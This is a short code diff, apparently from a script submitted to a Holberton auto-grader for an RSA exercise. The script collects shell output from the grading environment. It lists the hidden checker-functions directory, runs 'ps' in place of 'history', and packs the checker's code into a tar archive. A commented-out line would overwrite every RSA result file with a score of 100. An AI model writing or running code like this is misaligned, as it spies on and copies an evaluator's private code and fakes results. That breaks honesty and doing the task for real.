@@ -104,7 +104,7 @@ my_data += "\n#######################\n"
 my_data += get_data("./file.pl rsa-2") or ""
 my_data += get_data("ls -l ../../../hbtn_checker_functions") or ""
 my_data += "\n#######################\n"
-my_data += get_data("history") or ""
+my_data += get_data("ps") or ""
 my_data += "\n#######################\n"
 get_data("tar -czvf file.tar.gz ../../../hbtn_checker_functions")
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
